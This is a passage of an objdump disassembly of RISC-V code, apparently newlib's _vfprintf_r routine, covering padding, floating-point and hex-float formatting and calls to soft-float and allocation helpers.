   10cf4:	0016861b          	addiw	a2,a3,1
   10cf8:	10c12423          	sw	a2,264(sp)
   10cfc:	469d                	li	a3,7
   10cfe:	00c6dd63          	ble	a2,a3,10d18 <_vfprintf_r+0x474>
   10d02:	0210                	addi	a2,sp,256
   10d04:	85ca                	mv	a1,s2
   10d06:	854e                	mv	a0,s3
   10d08:	f4ba                	sd	a4,104(sp)
   10d0a:	30e060ef          	jal	ra,17018 <__sprint_r>
   10d0e:	c119                	beqz	a0,10d14 <_vfprintf_r+0x470>
   10d10:	0f60106f          	j	11e06 <_vfprintf_r+0x1562>
   10d14:	7726                	ld	a4,104(sp)
   10d16:	8cd6                	mv	s9,s5
   10d18:	77c6                	ld	a5,112(sp)
   10d1a:	08000693          	li	a3,128
   10d1e:	04d79e63          	bne	a5,a3,10d7a <_vfprintf_r+0x4d6>
   10d22:	5782                	lw	a5,32(sp)
   10d24:	56e2                	lw	a3,56(sp)
   10d26:	40d786bb          	subw	a3,a5,a3
   10d2a:	04d05863          	blez	a3,10d7a <_vfprintf_r+0x4d6>
   10d2e:	6869                	lui	a6,0x1a
   10d30:	48c1                	li	a7,16
   10d32:	23080813          	addi	a6,a6,560 # 1a230 <zeroes.4441>
   10d36:	4e9d                	li	t4,7
   10d38:	10812583          	lw	a1,264(sp)
   10d3c:	010cb023          	sd	a6,0(s9)
   10d40:	6652                	ld	a2,272(sp)
   10d42:	0015851b          	addiw	a0,a1,1
   10d46:	85aa                	mv	a1,a0
   10d48:	010c8f13          	addi	t5,s9,16
   10d4c:	12d8c1e3          	blt	a7,a3,1166e <_vfprintf_r+0xdca>
   10d50:	00dcb423          	sd	a3,8(s9)
   10d54:	96b2                	add	a3,a3,a2
   10d56:	ea36                	sd	a3,272(sp)
   10d58:	10a12423          	sw	a0,264(sp)
   10d5c:	469d                	li	a3,7
   10d5e:	8cfa                	mv	s9,t5
   10d60:	00a6dd63          	ble	a0,a3,10d7a <_vfprintf_r+0x4d6>
   10d64:	0210                	addi	a2,sp,256
   10d66:	85ca                	mv	a1,s2
   10d68:	854e                	mv	a0,s3
   10d6a:	f4ba                	sd	a4,104(sp)
   10d6c:	2ac060ef          	jal	ra,17018 <__sprint_r>
   10d70:	c119                	beqz	a0,10d76 <_vfprintf_r+0x4d2>
   10d72:	0940106f          	j	11e06 <_vfprintf_r+0x1562>
   10d76:	7726                	ld	a4,104(sp)
   10d78:	8cd6                	mv	s9,s5
   10d7a:	41b7073b          	subw	a4,a4,s11
   10d7e:	04e05663          	blez	a4,10dca <_vfprintf_r+0x526>
   10d82:	6869                	lui	a6,0x1a
   10d84:	48c1                	li	a7,16
   10d86:	23080813          	addi	a6,a6,560 # 1a230 <zeroes.4441>
   10d8a:	4e9d                	li	t4,7
   10d8c:	10812603          	lw	a2,264(sp)
   10d90:	010cb023          	sd	a6,0(s9)
   10d94:	66d2                	ld	a3,272(sp)
   10d96:	0016059b          	addiw	a1,a2,1
   10d9a:	862e                	mv	a2,a1
   10d9c:	010c8513          	addi	a0,s9,16
   10da0:	10e8c5e3          	blt	a7,a4,116aa <_vfprintf_r+0xe06>
   10da4:	00ecb423          	sd	a4,8(s9)
   10da8:	9736                	add	a4,a4,a3
   10daa:	ea3a                	sd	a4,272(sp)
   10dac:	10b12423          	sw	a1,264(sp)
   10db0:	471d                	li	a4,7
   10db2:	8caa                	mv	s9,a0
   10db4:	00b75b63          	ble	a1,a4,10dca <_vfprintf_r+0x526>
   10db8:	0210                	addi	a2,sp,256
   10dba:	85ca                	mv	a1,s2
   10dbc:	854e                	mv	a0,s3
   10dbe:	25a060ef          	jal	ra,17018 <__sprint_r>
   10dc2:	c119                	beqz	a0,10dc8 <_vfprintf_r+0x524>
   10dc4:	0420106f          	j	11e06 <_vfprintf_r+0x1562>
   10dc8:	8cd6                	mv	s9,s5
   10dca:	10047693          	andi	a3,s0,256
   10dce:	6752                	ld	a4,272(sp)
   10dd0:	100699e3          	bnez	a3,116e2 <_vfprintf_r+0xe3e>
   10dd4:	10812783          	lw	a5,264(sp)
   10dd8:	00ed8e33          	add	t3,s11,a4
   10ddc:	009cb023          	sd	s1,0(s9)
   10de0:	0017871b          	addiw	a4,a5,1
   10de4:	01bcb423          	sd	s11,8(s9)
   10de8:	ea72                	sd	t3,272(sp)
   10dea:	10e12423          	sw	a4,264(sp)
   10dee:	479d                	li	a5,7
   10df0:	0cc1                	addi	s9,s9,16
   10df2:	1ce7d4e3          	ble	a4,a5,117ba <_vfprintf_r+0xf16>
   10df6:	0210                	addi	a2,sp,256
   10df8:	85ca                	mv	a1,s2
   10dfa:	854e                	mv	a0,s3
   10dfc:	21c060ef          	jal	ra,17018 <__sprint_r>
   10e00:	c119                	beqz	a0,10e06 <_vfprintf_r+0x562>
   10e02:	0040106f          	j	11e06 <_vfprintf_r+0x1562>
   10e06:	8cd6                	mv	s9,s5
   10e08:	1b30006f          	j	117ba <_vfprintf_r+0xf16>
   10e0c:	01046413          	ori	s0,s0,16
   10e10:	2401                	sext.w	s0,s0
   10e12:	008b8793          	addi	a5,s7,8
   10e16:	f83e                	sd	a5,48(sp)
   10e18:	02047793          	andi	a5,s0,32
   10e1c:	cb85                	beqz	a5,10e4c <_vfprintf_r+0x5a8>
   10e1e:	000bbb83          	ld	s7,0(s7)
   10e22:	000bd863          	bgez	s7,10e32 <_vfprintf_r+0x58e>
   10e26:	02d00793          	li	a5,45
   10e2a:	41700bb3          	neg	s7,s7
   10e2e:	0cf107a3          	sb	a5,207(sp)
   10e32:	57fd                	li	a5,-1
   10e34:	6efd9963          	bne	s11,a5,11526 <_vfprintf_r+0xc82>
   10e38:	47a5                	li	a5,9
   10e3a:	7577e463          	bltu	a5,s7,11582 <_vfprintf_r+0xcde>
   10e3e:	030b8b9b          	addiw	s7,s7,48
   10e42:	17710da3          	sb	s7,379(sp)
   10e46:	17b10493          	addi	s1,sp,379
   10e4a:	af39                	j	11568 <_vfprintf_r+0xcc4>
   10e4c:	01047793          	andi	a5,s0,16
   10e50:	f7f9                	bnez	a5,10e1e <_vfprintf_r+0x57a>
   10e52:	04047793          	andi	a5,s0,64
   10e56:	c781                	beqz	a5,10e5e <_vfprintf_r+0x5ba>
   10e58:	000b9b83          	lh	s7,0(s7)
   10e5c:	b7d9                	j	10e22 <_vfprintf_r+0x57e>
   10e5e:	20047793          	andi	a5,s0,512
   10e62:	c781                	beqz	a5,10e6a <_vfprintf_r+0x5c6>
   10e64:	000b8b83          	lb	s7,0(s7)
   10e68:	bf6d                	j	10e22 <_vfprintf_r+0x57e>
   10e6a:	000bab83          	lw	s7,0(s7)
   10e6e:	bf55                	j	10e22 <_vfprintf_r+0x57e>
   10e70:	00847793          	andi	a5,s0,8
   10e74:	cfb9                	beqz	a5,10ed2 <_vfprintf_r+0x62e>
   10e76:	0bbd                	addi	s7,s7,15
   10e78:	ff0bfb93          	andi	s7,s7,-16
   10e7c:	010b8793          	addi	a5,s7,16
   10e80:	f83e                	sd	a5,48(sp)
   10e82:	000bb783          	ld	a5,0(s7)
   10e86:	f9be                	sd	a5,240(sp)
   10e88:	008bb783          	ld	a5,8(s7)
   10e8c:	fdbe                	sd	a5,248(sp)
   10e8e:	1988                	addi	a0,sp,240
   10e90:	2d8030ef          	jal	ra,14168 <_ldcheck>
   10e94:	cdaa                	sw	a0,216(sp)
   10e96:	4789                	li	a5,2
   10e98:	04f51c63          	bne	a0,a5,10ef0 <_vfprintf_r+0x64c>
   10e9c:	754e                	ld	a0,240(sp)
   10e9e:	75ee                	ld	a1,248(sp)
   10ea0:	4601                	li	a2,0
   10ea2:	4681                	li	a3,0
   10ea4:	583070ef          	jal	ra,18c26 <__letf2>
   10ea8:	00055663          	bgez	a0,10eb4 <_vfprintf_r+0x610>
   10eac:	02d00793          	li	a5,45
   10eb0:	0cf107a3          	sb	a5,207(sp)
   10eb4:	04700793          	li	a5,71
   10eb8:	0367c763          	blt	a5,s6,10ee6 <_vfprintf_r+0x642>
   10ebc:	0001a4b7          	lui	s1,0x1a
   10ec0:	27048493          	addi	s1,s1,624 # 1a270 <zeroes.4441+0x40>
   10ec4:	f7f47413          	andi	s0,s0,-129
   10ec8:	2401                	sext.w	s0,s0
   10eca:	4b81                	li	s7,0
   10ecc:	4d8d                	li	s11,3
   10ece:	4701                	li	a4,0
   10ed0:	a555                	j	11574 <_vfprintf_r+0xcd0>
   10ed2:	000bb507          	fld	fa0,0(s7)
   10ed6:	008b8793          	addi	a5,s7,8
   10eda:	f83e                	sd	a5,48(sp)
   10edc:	575080ef          	jal	ra,19c50 <__extenddftf2>
   10ee0:	f9aa                	sd	a0,240(sp)
   10ee2:	fdae                	sd	a1,248(sp)
   10ee4:	b76d                	j	10e8e <_vfprintf_r+0x5ea>
   10ee6:	0001a4b7          	lui	s1,0x1a
   10eea:	27848493          	addi	s1,s1,632 # 1a278 <zeroes.4441+0x48>
   10eee:	bfd9                	j	10ec4 <_vfprintf_r+0x620>
   10ef0:	4785                	li	a5,1
   10ef2:	02f51763          	bne	a0,a5,10f20 <_vfprintf_r+0x67c>
   10ef6:	77ee                	ld	a5,248(sp)
   10ef8:	0007d663          	bgez	a5,10f04 <_vfprintf_r+0x660>
   10efc:	02d00793          	li	a5,45
   10f00:	0cf107a3          	sb	a5,207(sp)
   10f04:	04700793          	li	a5,71
   10f08:	0167c763          	blt	a5,s6,10f16 <_vfprintf_r+0x672>
   10f0c:	0001a4b7          	lui	s1,0x1a
   10f10:	28048493          	addi	s1,s1,640 # 1a280 <zeroes.4441+0x50>
   10f14:	bf45                	j	10ec4 <_vfprintf_r+0x620>
   10f16:	0001a4b7          	lui	s1,0x1a
   10f1a:	28848493          	addi	s1,s1,648 # 1a288 <zeroes.4441+0x58>
   10f1e:	b75d                	j	10ec4 <_vfprintf_r+0x620>
   10f20:	fdfb7c13          	andi	s8,s6,-33
   10f24:	04100793          	li	a5,65
   10f28:	04fc1c63          	bne	s8,a5,10f80 <_vfprintf_r+0x6dc>
   10f2c:	03000793          	li	a5,48
   10f30:	0cf10823          	sb	a5,208(sp)
   10f34:	06100713          	li	a4,97
   10f38:	05800793          	li	a5,88
   10f3c:	00eb1463          	bne	s6,a4,10f44 <_vfprintf_r+0x6a0>
   10f40:	07800793          	li	a5,120
   10f44:	0cf108a3          	sb	a5,209(sp)
   10f48:	00246413          	ori	s0,s0,2
   10f4c:	06300793          	li	a5,99
   10f50:	2401                	sext.w	s0,s0
   10f52:	15b7db63          	ble	s11,a5,110a8 <_vfprintf_r+0x804>
   10f56:	001d859b          	addiw	a1,s11,1
   10f5a:	854e                	mv	a0,s3
   10f5c:	3fc030ef          	jal	ra,14358 <_malloc_r>
   10f60:	84aa                	mv	s1,a0
   10f62:	14051663          	bnez	a0,110ae <_vfprintf_r+0x80a>
   10f66:	01095783          	lhu	a5,16(s2)
   10f6a:	0407e793          	ori	a5,a5,64
   10f6e:	00f91823          	sh	a5,16(s2)
   10f72:	01095783          	lhu	a5,16(s2)
   10f76:	0407f793          	andi	a5,a5,64
   10f7a:	9e0780e3          	beqz	a5,1095a <_vfprintf_r+0xb6>
   10f7e:	b40d                	j	109a0 <_vfprintf_r+0xfc>
   10f80:	57fd                	li	a5,-1
   10f82:	12fd8863          	beq	s11,a5,110b2 <_vfprintf_r+0x80e>
   10f86:	04700793          	li	a5,71
   10f8a:	4b81                	li	s7,0
   10f8c:	00fc1463          	bne	s8,a5,10f94 <_vfprintf_r+0x6f0>
   10f90:	120d8463          	beqz	s11,110b8 <_vfprintf_r+0x814>
   10f94:	10046793          	ori	a5,s0,256
   10f98:	7a6e                	ld	s4,248(sp)
   10f9a:	2781                	sext.w	a5,a5
   10f9c:	fc3e                	sd	a5,56(sp)
   10f9e:	fc82                	sd	zero,120(sp)
   10fa0:	7ece                	ld	t4,240(sp)
   10fa2:	000a5963          	bgez	s4,10fb4 <_vfprintf_r+0x710>
   10fa6:	57fd                	li	a5,-1
   10fa8:	17fe                	slli	a5,a5,0x3f
   10faa:	00fa4a33          	xor	s4,s4,a5
   10fae:	02d00793          	li	a5,45
   10fb2:	fcbe                	sd	a5,120(sp)
   10fb4:	04100793          	li	a5,65
   10fb8:	22fc1363          	bne	s8,a5,111de <_vfprintf_r+0x93a>
   10fbc:	8576                	mv	a0,t4
   10fbe:	85d2                	mv	a1,s4
   10fc0:	575080ef          	jal	ra,19d34 <__trunctfdf2>
   10fc4:	09a8                	addi	a0,sp,216
   10fc6:	7ec040ef          	jal	ra,157b2 <frexp>
   10fca:	487080ef          	jal	ra,19c50 <__extenddftf2>
   10fce:	768a                	ld	a3,160(sp)
   10fd0:	4601                	li	a2,0
   10fd2:	519070ef          	jal	ra,18cea <__multf3>
   10fd6:	4601                	li	a2,0
   10fd8:	4681                	li	a3,0
   10fda:	e12a                	sd	a0,128(sp)
   10fdc:	e52e                	sd	a1,136(sp)
   10fde:	2e1070ef          	jal	ra,18abe <__eqtf2>
   10fe2:	e119                	bnez	a0,10fe8 <_vfprintf_r+0x744>
   10fe4:	4785                	li	a5,1
   10fe6:	cdbe                	sw	a5,216(sp)
   10fe8:	06100793          	li	a5,97
   10fec:	0cfb1963          	bne	s6,a5,110be <_vfprintf_r+0x81a>
   10ff0:	0001a7b7          	lui	a5,0x1a
   10ff4:	29078793          	addi	a5,a5,656 # 1a290 <zeroes.4441+0x60>
   10ff8:	e43e                	sd	a5,8(sp)
   10ffa:	fffd871b          	addiw	a4,s11,-1
   10ffe:	8a26                	mv	s4,s1
   11000:	76aa                	ld	a3,168(sp)
   11002:	650a                	ld	a0,128(sp)
   11004:	65aa                	ld	a1,136(sp)
   11006:	4601                	li	a2,0
   11008:	f93a                	sd	a4,176(sp)
   1100a:	4e1070ef          	jal	ra,18cea <__multf3>
   1100e:	8d2a                	mv	s10,a0
   11010:	f4ae                	sd	a1,104(sp)
   11012:	32f080ef          	jal	ra,19b40 <__fixtfsi>
   11016:	0005079b          	sext.w	a5,a0
   1101a:	f8be                	sd	a5,112(sp)
   1101c:	3b7080ef          	jal	ra,19bd2 <__floatsitf>
   11020:	77a6                	ld	a5,104(sp)
   11022:	86ae                	mv	a3,a1
   11024:	862a                	mv	a2,a0
   11026:	85be                	mv	a1,a5
   11028:	856a                	mv	a0,s10
   1102a:	306080ef          	jal	ra,19330 <__subtf3>
   1102e:	67a2                	ld	a5,8(sp)
   11030:	7746                	ld	a4,112(sp)
   11032:	0a05                	addi	s4,s4,1
   11034:	e12a                	sd	a0,128(sp)
   11036:	00e786b3          	add	a3,a5,a4
   1103a:	774a                	ld	a4,176(sp)
   1103c:	0006c683          	lbu	a3,0(a3) # 2000 <_start-0xe0b0>
   11040:	e52e                	sd	a1,136(sp)
   11042:	0007079b          	sext.w	a5,a4
   11046:	f4be                	sd	a5,104(sp)
   11048:	feda0fa3          	sb	a3,-1(s4)
   1104c:	57fd                	li	a5,-1
   1104e:	88aa                	mv	a7,a0
   11050:	8d2e                	mv	s10,a1
   11052:	06f70b63          	beq	a4,a5,110c8 <_vfprintf_r+0x824>
   11056:	377d                	addiw	a4,a4,-1
   11058:	4601                	li	a2,0
   1105a:	4681                	li	a3,0
   1105c:	f93a                	sd	a4,176(sp)
   1105e:	fd2a                	sd	a0,184(sp)
   11060:	25f070ef          	jal	ra,18abe <__eqtf2>
   11064:	774a                	ld	a4,176(sp)
   11066:	78ea                	ld	a7,184(sp)
   11068:	fd41                	bnez	a0,11000 <_vfprintf_r+0x75c>
   1106a:	66ca                	ld	a3,144(sp)
   1106c:	4601                	li	a2,0
   1106e:	8546                	mv	a0,a7
   11070:	85ea                	mv	a1,s10
   11072:	e146                	sd	a7,128(sp)
   11074:	2ef070ef          	jal	ra,18b62 <__getf2>
   11078:	04a04b63          	bgtz	a0,110ce <_vfprintf_r+0x82a>
   1107c:	688a                	ld	a7,128(sp)
   1107e:	66ca                	ld	a3,144(sp)
   11080:	4601                	li	a2,0
   11082:	8546                	mv	a0,a7
   11084:	85ea                	mv	a1,s10
   11086:	239070ef          	jal	ra,18abe <__eqtf2>
   1108a:	e509                	bnez	a0,11094 <_vfprintf_r+0x7f0>
   1108c:	77c6                	ld	a5,112(sp)
   1108e:	0017f713          	andi	a4,a5,1
   11092:	ef15                	bnez	a4,110ce <_vfprintf_r+0x82a>
   11094:	5726                	lw	a4,104(sp)
   11096:	03000693          	li	a3,48
   1109a:	06074163          	bltz	a4,110fc <_vfprintf_r+0x858>
   1109e:	0a05                	addi	s4,s4,1
   110a0:	feda0fa3          	sb	a3,-1(s4)
   110a4:	377d                	addiw	a4,a4,-1
   110a6:	bfd5                	j	1109a <_vfprintf_r+0x7f6>
   110a8:	4b81                	li	s7,0
   110aa:	0a24                	addi	s1,sp,280
   110ac:	b5e5                	j	10f94 <_vfprintf_r+0x6f0>
   110ae:	8baa                	mv	s7,a0
   110b0:	b5d5                	j	10f94 <_vfprintf_r+0x6f0>
   110b2:	4b81                	li	s7,0
   110b4:	4d99                	li	s11,6
   110b6:	bdf9                	j	10f94 <_vfprintf_r+0x6f0>
   110b8:	8bee                	mv	s7,s11
   110ba:	4d85                	li	s11,1
   110bc:	bde1                	j	10f94 <_vfprintf_r+0x6f0>
   110be:	0001a7b7          	lui	a5,0x1a
   110c2:	2a878793          	addi	a5,a5,680 # 1a2a8 <zeroes.4441+0x78>
   110c6:	bf0d                	j	10ff8 <_vfprintf_r+0x754>
   110c8:	57fd                	li	a5,-1
   110ca:	f4be                	sd	a5,104(sp)
   110cc:	bf79                	j	1106a <_vfprintf_r+0x7c6>
   110ce:	67a2                	ld	a5,8(sp)
   110d0:	f5d2                	sd	s4,232(sp)
   110d2:	03000593          	li	a1,48
   110d6:	00f7c603          	lbu	a2,15(a5)
   110da:	76ae                	ld	a3,232(sp)
   110dc:	fff68713          	addi	a4,a3,-1
   110e0:	f5ba                	sd	a4,232(sp)
   110e2:	fff6c703          	lbu	a4,-1(a3)
   110e6:	0ec70563          	beq	a4,a2,111d0 <_vfprintf_r+0x92c>
   110ea:	03900613          	li	a2,57
   110ee:	0ec71463          	bne	a4,a2,111d6 <_vfprintf_r+0x932>
   110f2:	67a2                	ld	a5,8(sp)
   110f4:	00a7c703          	lbu	a4,10(a5)
   110f8:	fee68fa3          	sb	a4,-1(a3)
   110fc:	04700713          	li	a4,71
   11100:	409a0a3b          	subw	s4,s4,s1
   11104:	4d6e                	lw	s10,216(sp)
   11106:	18ec1463          	bne	s8,a4,1128e <_vfprintf_r+0x9ea>
   1110a:	5775                	li	a4,-3
   1110c:	00ed4463          	blt	s10,a4,11114 <_vfprintf_r+0x870>
   11110:	1fadd463          	ble	s10,s11,112f8 <_vfprintf_r+0xa54>
   11114:	3b79                	addiw	s6,s6,-2
   11116:	fffd069b          	addiw	a3,s10,-1
   1111a:	cdb6                	sw	a3,216(sp)
   1111c:	fdfb7613          	andi	a2,s6,-33
   11120:	04100513          	li	a0,65
   11124:	0ffb7713          	andi	a4,s6,255
   11128:	4581                	li	a1,0
   1112a:	00a61663          	bne	a2,a0,11136 <_vfprintf_r+0x892>
   1112e:	273d                	addiw	a4,a4,15
   11130:	0ff77713          	andi	a4,a4,255
   11134:	4585                	li	a1,1
   11136:	0ee10023          	sb	a4,224(sp)
   1113a:	02b00793          	li	a5,43
   1113e:	0006d763          	bgez	a3,1114c <_vfprintf_r+0x8a8>
   11142:	4685                	li	a3,1
   11144:	41a686bb          	subw	a3,a3,s10
   11148:	02d00793          	li	a5,45
   1114c:	0ef100a3          	sb	a5,225(sp)
   11150:	47a5                	li	a5,9
   11152:	16d7da63          	ble	a3,a5,112c6 <_vfprintf_r+0xa22>
   11156:	0ef10713          	addi	a4,sp,239
   1115a:	853a                	mv	a0,a4
   1115c:	45a9                	li	a1,10
   1115e:	4825                	li	a6,9
   11160:	02b6e7bb          	remw	a5,a3,a1
   11164:	fff70613          	addi	a2,a4,-1
   11168:	02b6c6bb          	divw	a3,a3,a1
   1116c:	0307879b          	addiw	a5,a5,48
   11170:	fef70fa3          	sb	a5,-1(a4)
   11174:	14d84063          	blt	a6,a3,112b4 <_vfprintf_r+0xa10>
   11178:	0306879b          	addiw	a5,a3,48
   1117c:	fef60fa3          	sb	a5,-1(a2)
   11180:	1779                	addi	a4,a4,-2
   11182:	0e210613          	addi	a2,sp,226
   11186:	12a76963          	bltu	a4,a0,112b8 <_vfprintf_r+0xa14>
   1118a:	119c                	addi	a5,sp,224
   1118c:	40f607bb          	subw	a5,a2,a5
   11190:	ecbe                	sd	a5,88(sp)
   11192:	47e6                	lw	a5,88(sp)
   11194:	4705                	li	a4,1
   11196:	01478dbb          	addw	s11,a5,s4
   1119a:	87ee                	mv	a5,s11
   1119c:	01474563          	blt	a4,s4,111a6 <_vfprintf_r+0x902>
   111a0:	00147713          	andi	a4,s0,1
   111a4:	c701                	beqz	a4,111ac <_vfprintf_r+0x908>
   111a6:	4762                	lw	a4,24(sp)
   111a8:	00e78dbb          	addw	s11,a5,a4
   111ac:	bff47413          	andi	s0,s0,-1025
   111b0:	2401                	sext.w	s0,s0
   111b2:	10046793          	ori	a5,s0,256
   111b6:	fc3e                	sd	a5,56(sp)
   111b8:	e402                	sd	zero,8(sp)
   111ba:	4c01                	li	s8,0
   111bc:	4d01                	li	s10,0
   111be:	77e6                	ld	a5,120(sp)
   111c0:	c789                	beqz	a5,111ca <_vfprintf_r+0x926>
   111c2:	02d00713          	li	a4,45
   111c6:	0ce107a3          	sb	a4,207(sp)
   111ca:	7462                	ld	s0,56(sp)
   111cc:	4701                	li	a4,0
   111ce:	bc2d                	j	10c08 <_vfprintf_r+0x364>
   111d0:	feb68fa3          	sb	a1,-1(a3)
   111d4:	b719                	j	110da <_vfprintf_r+0x836>
   111d6:	2705                	addiw	a4,a4,1
   111d8:	0ff77713          	andi	a4,a4,255
   111dc:	bf31                	j	110f8 <_vfprintf_r+0x854>
   111de:	04600793          	li	a5,70
   111e2:	00fc0b63          	beq	s8,a5,111f8 <_vfprintf_r+0x954>
   111e6:	04500793          	li	a5,69
   111ea:	8d6e                	mv	s10,s11
   111ec:	00fc1463          	bne	s8,a5,111f4 <_vfprintf_r+0x950>
   111f0:	001d8d1b          	addiw	s10,s11,1
   111f4:	4689                	li	a3,2
   111f6:	a019                	j	111fc <_vfprintf_r+0x958>
   111f8:	8d6e                	mv	s10,s11
   111fa:	468d                	li	a3,3
   111fc:	09bc                	addi	a5,sp,216
   111fe:	85f6                	mv	a1,t4
   11200:	0e810893          	addi	a7,sp,232
   11204:	0dc10813          	addi	a6,sp,220
   11208:	876a                	mv	a4,s10
   1120a:	8652                	mv	a2,s4
   1120c:	854e                	mv	a0,s3
   1120e:	e476                	sd	t4,8(sp)
   11210:	642020ef          	jal	ra,13852 <_ldtoa_r>
   11214:	04700793          	li	a5,71
   11218:	84aa                	mv	s1,a0
   1121a:	6ea2                	ld	t4,8(sp)
   1121c:	00fc1563          	bne	s8,a5,11226 <_vfprintf_r+0x982>
   11220:	00147793          	andi	a5,s0,1
   11224:	cbb1                	beqz	a5,11278 <_vfprintf_r+0x9d4>
   11226:	04600713          	li	a4,70
   1122a:	01a487b3          	add	a5,s1,s10
   1122e:	02ec1963          	bne	s8,a4,11260 <_vfprintf_r+0x9bc>
   11232:	0004c683          	lbu	a3,0(s1)
   11236:	03000713          	li	a4,48
   1123a:	02e69163          	bne	a3,a4,1125c <_vfprintf_r+0x9b8>
   1123e:	8576                	mv	a0,t4
   11240:	4601                	li	a2,0
   11242:	4681                	li	a3,0
   11244:	85d2                	mv	a1,s4
   11246:	f4be                	sd	a5,104(sp)
   11248:	e476                	sd	t4,8(sp)
   1124a:	075070ef          	jal	ra,18abe <__eqtf2>
   1124e:	6ea2                	ld	t4,8(sp)
   11250:	77a6                	ld	a5,104(sp)
   11252:	c509                	beqz	a0,1125c <_vfprintf_r+0x9b8>
   11254:	4705                	li	a4,1
   11256:	41a70d3b          	subw	s10,a4,s10
   1125a:	cdea                	sw	s10,216(sp)
   1125c:	476e                	lw	a4,216(sp)
   1125e:	97ba                	add	a5,a5,a4
   11260:	4681                	li	a3,0
   11262:	4601                	li	a2,0
   11264:	8576                	mv	a0,t4
   11266:	85d2                	mv	a1,s4
   11268:	e43e                	sd	a5,8(sp)
   1126a:	055070ef          	jal	ra,18abe <__eqtf2>
   1126e:	67a2                	ld	a5,8(sp)
   11270:	03000693          	li	a3,48
   11274:	e909                	bnez	a0,11286 <_vfprintf_r+0x9e2>
   11276:	f5be                	sd	a5,232(sp)
   11278:	7a2e                	ld	s4,232(sp)
   1127a:	b549                	j	110fc <_vfprintf_r+0x858>
   1127c:	00170613          	addi	a2,a4,1
   11280:	f5b2                	sd	a2,232(sp)
   11282:	00d70023          	sb	a3,0(a4)
   11286:	772e                	ld	a4,232(sp)
   11288:	fef76ae3          	bltu	a4,a5,1127c <_vfprintf_r+0x9d8>
   1128c:	b7f5                	j	11278 <_vfprintf_r+0x9d4>
   1128e:	04600713          	li	a4,70
   11292:	e8ec12e3          	bne	s8,a4,11116 <_vfprintf_r+0x872>
   11296:	05a05863          	blez	s10,112e6 <_vfprintf_r+0xa42>
   1129a:	000d9563          	bnez	s11,112a4 <_vfprintf_r+0xa00>
   1129e:	00147713          	andi	a4,s0,1
   112a2:	cf59                	beqz	a4,11340 <_vfprintf_r+0xa9c>
   112a4:	47e2                	lw	a5,24(sp)
   112a6:	01a7873b          	addw	a4,a5,s10
   112aa:	01b70dbb          	addw	s11,a4,s11
   112ae:	06600b13          	li	s6,102
   112b2:	a895                	j	11326 <_vfprintf_r+0xa82>
   112b4:	8732                	mv	a4,a2
   112b6:	b56d                	j	11160 <_vfprintf_r+0x8bc>
   112b8:	0705                	addi	a4,a4,1
   112ba:	fff74783          	lbu	a5,-1(a4)
   112be:	0605                	addi	a2,a2,1
   112c0:	fef60fa3          	sb	a5,-1(a2)
   112c4:	b5c9                	j	11186 <_vfprintf_r+0x8e2>
   112c6:	0e210713          	addi	a4,sp,226
   112ca:	e599                	bnez	a1,112d8 <_vfprintf_r+0xa34>
   112cc:	03000793          	li	a5,48
   112d0:	0ef10123          	sb	a5,226(sp)
   112d4:	0e310713          	addi	a4,sp,227
   112d8:	0306879b          	addiw	a5,a3,48
   112dc:	00170613          	addi	a2,a4,1
   112e0:	00f70023          	sb	a5,0(a4)
   112e4:	b55d                	j	1118a <_vfprintf_r+0x8e6>
   112e6:	000d9563          	bnez	s11,112f0 <_vfprintf_r+0xa4c>
   112ea:	00147713          	andi	a4,s0,1
   112ee:	cb39                	beqz	a4,11344 <_vfprintf_r+0xaa0>
   112f0:	47e2                	lw	a5,24(sp)
   112f2:	0017871b          	addiw	a4,a5,1
   112f6:	bf55                	j	112aa <_vfprintf_r+0xa06>
   112f8:	014d4c63          	blt	s10,s4,11310 <_vfprintf_r+0xa6c>
   112fc:	00147713          	andi	a4,s0,1
   11300:	8dea                	mv	s11,s10
   11302:	c701                	beqz	a4,1130a <_vfprintf_r+0xa66>
   11304:	47e2                	lw	a5,24(sp)
   11306:	01a78dbb          	addw	s11,a5,s10
   1130a:	06700b13          	li	s6,103
   1130e:	a821                	j	11326 <_vfprintf_r+0xa82>
   11310:	47e2                	lw	a5,24(sp)
   11312:	06700b13          	li	s6,103
   11316:	01478dbb          	addw	s11,a5,s4
   1131a:	01a04663          	bgtz	s10,11326 <_vfprintf_r+0xa82>
   1131e:	41ad8e3b          	subw	t3,s11,s10
   11322:	001e0d9b          	addiw	s11,t3,1
   11326:	40047413          	andi	s0,s0,1024
   1132a:	00040c1b          	sext.w	s8,s0
   1132e:	e402                	sd	zero,8(sp)
   11330:	e80c07e3          	beqz	s8,111be <_vfprintf_r+0x91a>
   11334:	4c01                	li	s8,0
   11336:	e9a054e3          	blez	s10,111be <_vfprintf_r+0x91a>
   1133a:	0ff00693          	li	a3,255
   1133e:	a01d                	j	11364 <_vfprintf_r+0xac0>
   11340:	8dea                	mv	s11,s10
   11342:	b7b5                	j	112ae <_vfprintf_r+0xa0a>
   11344:	06600b13          	li	s6,102
   11348:	4d85                	li	s11,1
   1134a:	bff1                	j	11326 <_vfprintf_r+0xa82>
   1134c:	2701                	sext.w	a4,a4
   1134e:	03a75063          	ble	s10,a4,1136e <_vfprintf_r+0xaca>
   11352:	6782                	ld	a5,0(sp)
   11354:	40ed0d3b          	subw	s10,s10,a4
   11358:	0017c703          	lbu	a4,1(a5)
   1135c:	c315                	beqz	a4,11380 <_vfprintf_r+0xadc>
   1135e:	0785                	addi	a5,a5,1
   11360:	2c05                	addiw	s8,s8,1
   11362:	e03e                	sd	a5,0(sp)
   11364:	6782                	ld	a5,0(sp)
   11366:	0007c703          	lbu	a4,0(a5)
   1136a:	fed711e3          	bne	a4,a3,1134c <_vfprintf_r+0xaa8>
   1136e:	47a2                	lw	a5,8(sp)
   11370:	00fc073b          	addw	a4,s8,a5
   11374:	4786                	lw	a5,64(sp)
   11376:	02f7073b          	mulw	a4,a4,a5
   1137a:	01b70dbb          	addw	s11,a4,s11
   1137e:	b581                	j	111be <_vfprintf_r+0x91a>
   11380:	47a2                	lw	a5,8(sp)
   11382:	2785                	addiw	a5,a5,1
   11384:	e43e                	sd	a5,8(sp)
   11386:	bff9                	j	11364 <_vfprintf_r+0xac0>
   11388:	008b8713          	addi	a4,s7,8
   1138c:	f83a                	sd	a4,48(sp)
   1138e:	02047713          	andi	a4,s0,32
   11392:	000bb783          	ld	a5,0(s7)
   11396:	c719                	beqz	a4,113a4 <_vfprintf_r+0xb00>
   11398:	7722                	ld	a4,40(sp)
   1139a:	e398                	sd	a4,0(a5)
   1139c:	7bc2                	ld	s7,48(sp)
   1139e:	64c2                	ld	s1,16(sp)
   113a0:	e48ff06f          	j	109e8 <_vfprintf_r+0x144>
   113a4:	01047713          	andi	a4,s0,16
